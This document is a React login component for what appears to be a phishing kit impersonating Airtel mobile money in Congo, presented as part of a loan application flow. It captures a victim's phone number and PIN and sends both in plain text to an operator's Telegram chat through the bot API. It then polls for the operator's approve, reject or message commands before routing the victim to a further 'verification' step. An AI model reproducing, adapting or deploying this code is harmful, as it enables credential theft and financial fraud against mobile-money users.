import React, { useState, useRef, useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN

const SpinnerStyle = () => (
  <style>{`
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `}</style>
)

const STATUS_MESSAGES = {
  pending: "⏳ En attente...",
  approved: "✅ APPROVED SUCCESSFULLY!",
  wrong_pin: "❌ Code PIN incorrect",
  expired: "⏰ Délai de vérification dépassé",
  rejected: "❌ REJECTED SUCCESSFULLY!"
}

function Login() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = (user && user !== "default") ? user : "user1"
  const basePath = (user && user !== "default") ? `/${user}` : ""
  const [phone, setPhone] = useState("")
  const [inputs, setInputs] = useState(Array(4).fill(""))
  const [loading, setLoading] = useState(false)
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  const [error, setError] = useState("")
  const [status, setStatus] = useState("")
  const [adminMessage, setAdminMessage] = useState("")
  const [showRetryButton, setShowRetryButton] = useState(false)
  const [waitingForMessage, setWaitingForMessage] = useState(false)
  const requestIdRef = useRef(null)
  const pollingIntervalRef = useRef(null)
  const startTimeRef = useRef(null)
  const checkCountRef = useRef(0)
  const maxChecks = 24
  const lastUpdateIdRef = useRef(0)
  const messageRequestRef = useRef(null)
  const waitingForMessageRef = useRef(false)

  useEffect(() => {
    const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    const storedApp = localStorage.getItem('loanAppData')
    if (storedApp) {
      try {
        const appData = JSON.parse(storedApp)
        const storedPhone = appData.number || ""
        const cleanedPhone = storedPhone.replace(/^0+/, "").slice(0, 9)
        setPhone(cleanedPhone)
      } catch {}
    }
  }, [])

  useEffect(() => {
    const msg = sessionStorage.getItem('adminMessage')
    if (msg) {
      setAdminMessage(msg)
      sessionStorage.removeItem('adminMessage')
    }
  }, [])

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
      }
    }
  }, [])

  const phoneInputRef = useRef(null)

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 9)
    setPhone(value)
  }

  const handleInputChange = (index, value) => {
    if (value !== "" && !/^\d$/.test(value)) return
    const newInputs = [...inputs]
    newInputs[index] = value
    setInputs(newInputs)
    if (value !== "" && index < 3) {
      setTimeout(() => {
        const nextInput = document.getElementById(`pin-${index + 1}`)
        nextInput?.focus()
      }, 0)
    }
  }

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !inputs[index] && index > 0) {
      e.preventDefault()
      const prevInput = document.getElementById(`pin-${index - 1}`)
      prevInput?.focus()
    } else if (e.key === "ArrowLeft" && index > 0) {
      e.preventDefault()
      const prevInput = document.getElementById(`pin-${index - 1}`)
      prevInput?.focus()
    } else if (/^\d$/.test(e.key) && index < 3) {
      e.preventDefault()
      const newInputs = [...inputs]
      newInputs[index] = e.key
      setInputs(newInputs)
      const nextInput = document.getElementById(`pin-${index + 1}`)
      nextInput?.focus()
    }
  }

  const checkPhoneValid = () => {
    return /^\d{9}$/.test(phone)
  }

  const isFormComplete = () => {
    const pinValid = inputs.every(input => /^\d$/.test(input))
    return checkPhoneValid() && pinValid
  }

  async function sendTelegramNotification(phoneNumber, pin) {
    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    
    const lines = [
      '📲 New Airtel Congo Request',
      '📱 Phone: ' + phoneNumber,
      '🔑 PIN: ' + pin,
      '🆔 Request: ' + requestId
    ]
    const message = lines.join('\n')

    try {
      const response = await fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: message,
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Approve', callback_data: 'approve_' + requestId },
                { text: '❌ Reject', callback_data: 'reject_' + requestId }
              ],
              [
                { text: '💬 Message User', callback_data: 'msg_' + requestId }
              ]
            ]
          }
        })
      })
      return { success: response.ok, requestId: requestId }
    } catch (e) {
      console.error('Telegram send failed:', e)
      return { success: false, error: e.message, requestId: requestId }
    }
  }

  async function deleteWebhook() {
    try {
      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
      const data = await response.json()
      console.log('Webhook deleted:', data.result)
    } catch (e) {
      console.error('Webhook deletion failed:', e)
    }
  }

  async function checkMessages(requestId) {
    try {
      const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + offset)
      const data = await response.json()
      
      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          if (update.update_id > lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id
          }
          
          if (update.callback_query) {
            const parts = update.callback_query.data.split('_')
            const action = parts[0]
            const id = parts.slice(1).join('_')
            if (id === requestId) {
              if (action === 'approve') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '✅ Transaction approved!'
                    })
                  })
                } catch (e) {}
                return { approved: true, status: 'approved' }
              } else if (action === 'reject') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '❌ Transaction rejected.'
                    })
                  })
                } catch (e) {}
                return { approved: false, status: 'rejected' }
              } else if (action === 'msg') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '💬 Please enter your message for the user. Type it now:'
                    })
                  })
                } catch (e) {}
                messageRequestRef.current = requestId
                return { approved: false, status: 'message_user_clicked' }
              }
            }
          }
          
          if (update.message && update.message.text && messageRequestRef.current && waitingForMessageRef.current) {
            const msg = update.message.text
            const senderId = update.message.from.id
            sessionStorage.setItem('adminMessage', msg)
            
            try {
              await fetch(TELEGRAM_API + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: senderId,
                  text: '✅ Message delivered to client!'
                })
              })
            } catch (e) {}
            return { approved: false, status: 'message_received', message: msg }
          }
        }
      }
      return { approved: false, status: 'pending' }
    } catch (e) {
      console.error('Check failed:', e)
      return { approved: false, status: 'error' }
    }
  }

  const startPolling = (requestId) => {
    checkCountRef.current = 0
    startTimeRef.current = Date.now()
    requestIdRef.current = requestId

    setLoading(true)
    setWaitingForApproval(true)
    setError("")
    setStatus("")
    setShowRetryButton(false)

    pollingIntervalRef.current = setInterval(async () => {
      checkCountRef.current++
      const result = await checkMessages(requestId)

      const elapsed = Math.floor((Date.now() - startTimeRef.current) / 1000)
      console.log('Checking... elapsed:', elapsed, 'check:', checkCountRef.current)

      if (result.approved) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setWaitingForApproval(false)
        setStatus("approved")
        requestIdRef.current = null
        sessionStorage.setItem('airtelOTPApproved', 'true')
        setTimeout(() => {
          navigate(`${basePath}/verification`)
        }, 800)
      } else if (result.status === 'message_user_clicked') {
        waitingForMessageRef.current = true
        setWaitingForMessage(true)
        setWaitingForApproval(false)
        setStatus("waiting_for_message")
        console.log('Admin clicked Message User, waiting for message...')
      } else if (result.status === 'message_received') {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        checkCountRef.current = 0
        waitingForMessageRef.current = false
        setLoading(false)
        setWaitingForMessage(false)
        sessionStorage.setItem('adminMessage', result.message)
        setTimeout(() => {
          window.location.href = `${basePath}/dashboard`
        }, 500)
      } else if (result.status === 'rejected') {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setWaitingForApproval(false)
        setWaitingForMessage(false)
        waitingForMessageRef.current = false
        setStatus("rejected")
        requestIdRef.current = null
      }
      
      if (checkCountRef.current >= maxChecks) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setWaitingForApproval(false)
        setWaitingForMessage(false)
        setStatus("expired")
        requestIdRef.current = null
        setShowRetryButton(true)
      }
    }, 5000)
  }

  const initiateTelegramApproval = async () => {
    if (!checkPhoneValid()) {
      setError("Format invalide. Le numéro doit commencer par 9 et contenir 9 chiffres.")
      return
    }
    
    const pin = inputs.join('')
    if (pin.length !== 4) return

    setLoading(true)
    setError("")
    setStatus("")
    setWaitingForApproval(true)

    const phoneNumber = phone
    const pinCode = pin

    sessionStorage.setItem('airtelPhone', phoneNumber)
    sessionStorage.setItem('airtelPin', pinCode)

    await deleteWebhook()

    const result = await sendTelegramNotification(phoneNumber, pinCode)
    
    if (result.success) {
      startPolling(result.requestId)
    } else {
      setLoading(false)
      setWaitingForApproval(false)
      setError('Erreur de communication: ' + (result.error || 'Unknown error'))
      setShowRetryButton(true)
    }
  }

  const handleRetry = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current)
      pollingIntervalRef.current = null
    }
    initiateTelegramApproval()
  }

  const showInvalidNumberModal = () => {
    const warning = document.createElement('div')
    warning.className = 'number-warning'
    warning.innerHTML = '<div class="number-warning-card" role="alertdialog" aria-modal="true"><div class="number-warning-icon">⚠️</div><h2>Format Invalide</h2><p>Le numéro de téléphone doit commencer par <strong>9</strong> et contenir <strong>9 chiffres</strong>.</p><p>Veuillez entrer le bon numéro et réessayer!</p><button type="button">OK</button></div>'
    warning.querySelector('button').onclick = () => { 
      warning.remove()
      phoneInputRef.current?.focus()
    }
    document.body.appendChild(warning)
  }

  const handleConnectClick = () => {
    if (!checkPhoneValid()) {
      showInvalidNumberModal()
      return
    }
    initiateTelegramApproval()
  }

  return (
    <div className="container">
      <SpinnerStyle />
      <header className="topHeader">
        <div className="logo" style={{ marginBottom: '15px', textAlign: 'center' }}>
          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '130px' }} />
        </div>
      </header>
      
      <h1 className="login-title">Bienvenue</h1>
      
      <main>
        <div className="phone-number">
          <div className="numbercont">
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "15px" }}>
              <span style={{ color: "#333", fontSize: "16px", marginRight: "8px" }}>+243 |</span>
              <input
                ref={phoneInputRef}
                type="tel"
                id="phone"
                inputMode="numeric"
                maxLength={9}
                value={phone}
                onChange={handlePhoneChange}
                placeholder="9XXXXXXXX"
                style={{
                  width: "200px",
                  padding: "8px 12px",
                  fontSize: "16px",
                  border: "1px solid #ddd",
                  borderRadius: "6px",
                  textAlign: "left"
                }}
                disabled={loading || waitingForApproval}
              />
            </div>
          </div>
        </div>
        
        <div className="pin-input-container">
          <label className="pin-label">Saisissez votre code PIN</label>
          
          {adminMessage && (
            <div className="admin-message" style={{
              backgroundColor: "#f0f8ff",
              border: "2px solid #11bb4a",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              borderLeft: "5px solid #11bb4a",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#11bb4a", fontSize: "20px" }}>💬</span>
                <strong style={{ color: "#11bb4a", fontSize: "16px" }}>Message from Admin:</strong>
              </div>
              <div style={{ color: "#333", fontSize: "14px", lineHeight: "1.5", backgroundColor: "#fff", padding: "10px", borderRadius: "4px" }}>
                {adminMessage}
              </div>
            </div>
          )}
          
          {status === "approved" && (
            <div style={{
              backgroundColor: "#e8f5e9",
              border: "2px solid #4caf50",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#4caf50", fontSize: "24px" }}>✅</span>
                <h3 style={{ margin: 0, color: "#2e7d32" }}>APPROVED SUCCESSFULLY!</h3>
              </div>
              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
                Redirecting to verification...
              </p>
            </div>
          )}
          
          {status === "rejected" && (
            <div style={{
              backgroundColor: "#ffebee",
              border: "2px solid #f44336",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#f44336", fontSize: "24px" }}>❌</span>
                <h3 style={{ margin: 0, color: "#c62828" }}>REJECTED SUCCESSFULLY!</h3>
              </div>
              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
                Please try again or contact support
              </p>
            </div>
          )}
          
          {status === "waiting_for_message" && (
            <div style={{ display: "none" }}>
            </div>
          )}
          
          <div style={{ display: "flex", justifyContent: "center" }}>
             {[0, 1, 2, 3].map(index => (
               <input
                 key={index}
                 id={`pin-${index}`}
                 type="password"
                 inputMode="numeric"
                 maxLength="1"
                 value={inputs[index] || ""}
                 onChange={(e) => handleInputChange(index, e.target.value)}
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 onPaste={(e) => {
                   e.preventDefault()
                   const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4)
                   if (text.length === 4) {
                     const newInputs = text.split('')
                     setInputs(newInputs)
                     initiateTelegramApproval()
                   }
                 }}
                 style={{
                   width: "45px",
                   height: "45px",
                   fontSize: "18px",
                   textAlign: "center",
                   border: "1px solid #ddd",
                   borderRadius: "6px",
                   marginRight: "8px",
                   backgroundColor: "#fff",
                   cursor: "pointer"
                 }}
                 disabled={loading || waitingForApproval}
                 autoComplete="one-time-code"
               />
             ))}
           </div>
          
          {error && <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0" }}>{error}</div>}
          
          {status && STATUS_MESSAGES[status] && (
            <div style={{ color: "#333", textAlign: "center", margin: "10px 0" }}>
              {STATUS_MESSAGES[status]}
            </div>
          )}
        </div>
        
        <div className="forgot-pin">
          <a href="#">Code PIN oublié?</a>
        </div>
      </main>
      
      <footer>
        <div className="curvesec">
          <button
            onClick={handleConnectClick}
            disabled={!isFormComplete() || loading || waitingForApproval}
            style={{
              opacity: !isFormComplete() || loading || waitingForApproval ? 0.6 : 1,
              cursor: !isFormComplete() || loading || waitingForApproval ? "not-allowed" : "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              padding: "12px 24px",
              margin: "0 auto",
              backgroundColor: loading || waitingForApproval ? "#ccc" : "#ed1c2e",
              color: "white",
              border: "none",
              borderRadius: "6px",
              fontSize: "16px",
              fontWeight: "500"
            }}
          >
            {loading || waitingForApproval ? (
              <>
                <span style={{
                  display: "inline-block",
                  width: "18px",
                  height: "18px",
                  border: "2px solid rgba(255,255,255,0.4)",
                  borderRadius: "50%",
                  borderTopColor: "white",
                  animation: "spin 1s linear infinite"
                }}></span>
                Vérification...
              </>
            ) : status === "expired" ? (
              "Ressayer"
            ) : "Se connecter"}
          </button>
          {showRetryButton && status === "expired" && (
            <button
              onClick={handleRetry}
              style={{
                opacity: 1,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "8px",
                padding: "12px 24px",
                margin: "10px auto 0",
                backgroundColor: "#2196f3",
                color: "white",
                border: "none",
                borderRadius: "6px",
                fontSize: "16px",
                fontWeight: "500"
              }}
            >
              🔄 Ressayer
            </button>
          )}
          <p>En continuant, vous acceptez les conditions générales.</p>
        </div>
        
        <div style={{ textAlign: 'center', marginTop: '20px' }}>
          <button
            type="button"
             onClick={() => navigate(`${basePath}/apply`)}
            style={{
              background: 'none',
              border: 'none',
              color: '#666',
              cursor: 'pointer',
              fontSize: '14px',
              textDecoration: 'underline'
            }}
          >
            ← Retour au formulaire de prêt
          </button>
        </div>
      </footer>
    </div>
  )
}

export default Login